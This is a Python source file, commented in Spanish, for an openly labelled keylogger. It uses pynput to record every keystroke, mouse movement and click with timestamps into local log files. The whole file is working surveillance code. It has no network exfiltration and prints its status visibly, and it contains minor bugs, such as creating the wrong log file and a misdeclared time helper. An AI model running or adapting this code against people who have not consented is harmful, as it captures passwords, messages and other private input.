# Librerías necesarias
import os
import time
from datetime import datetime
from pynput import keyboard, mouse

# Clase del Keylogger
class Keylog:
    def __init__(self):
        "Inicializa la ruta del archivo y los listeners"
        self.lastmousemov = 0
        self.keyslog = os.path.join(os.getcwd(), "keys.log")
        self.mouselog = os.path.join(os.getcwd(), "mouse.log")
        self.keyboard_listener = None
        self.mouse_listener = None
    def gettime():
        "Devuelve la hora actual"
        time = datetime.now()
        format_time = time.strftime("%d/%m/%Y, %H:%M:%S")
        return format_time
    def pathCheck(self):
        "Verifica si existe el archivo keys.log y mouse.log, si no los crea"
        if not os.path.exists(self.keyslog):
            print("Creando archivo keys.log...")
            time.sleep(0.5)
            open(self.keyslog, "w").close()
            time.sleep(0.5)
            print(f"{self.keyslog} creado")
        if not os.path.exists(self.mouselog):
            print("Creando archivo mouse.log...")
            time.sleep(0.5)
            open(self.keyslog, "w").close()
            time.sleep(0.5)
            print(f"{self.mouselog} creado")
    def start_listening(self):
        "Inicia los listeners de teclado y mouse"
        self.keyboard_listener = keyboard.Listener(on_press=self.keylogger)
        self.mouse_listener = mouse.Listener(on_move=self.mouselogger, on_click=self.mouseclick)
        self.keyboard_listener.start()
        self.mouse_listener.start()
        print("Escuchando teclas y mouse...")

        self.keyboard_listener.join()
        self.mouse_listener.join()

    def keylogger(self, key):
        "Captura las teclas presionadas y las guarda en el log"
        try:
            with open(self.keyslog, "a") as log:
                log.write(f"[Tiempo] {Keylog.gettime()} [TECLA] {key}\n")
        except Exception as e:
            log.write(f"Error al registrar tecla: {e}")
            print(f"Error al registrar tecla: {e}")

    def mouselogger(self, x, y):
        "Registra el movimiento del mouse"
        try:
            tiempoact = time.time()
            if tiempoact - self.lastmousemov >= 2:
                with open(self.mouselog, "a") as log:
                    log.write(f"[Tiempo] {Keylog.gettime()} [MOUSE MOVE] Posicion: {x}, {y}\n")
                self.lastmousemov = tiempoact
        except Exception as e:
            log.write(f"Error al registrar movimiento: {e}")
            print(f"Error al registrar movimiento: {e}")

    def mouseclick(self, x, y, button, pressed):
        "Registra los clics del mouse"
        try:
            with open(self.mouselog, "a") as log:
                estado = "Presionado" if pressed else "Soltado"
                log.write(f"[Tiempo] {Keylog.gettime()} [CLICK] {button} {estado} en ({x}, {y})\n")
        except Exception as e:
            log.write(f"Error al registrar click: {e}")
            print(f"Error al registrar click: {e}")

def main():
    keylogger = Keylog()
    keylogger.pathCheck()
    keylogger.start_listening()

if __name__ == "__main__":
    print("Keylogger iniciado")
    time.sleep(0.2)
    main()
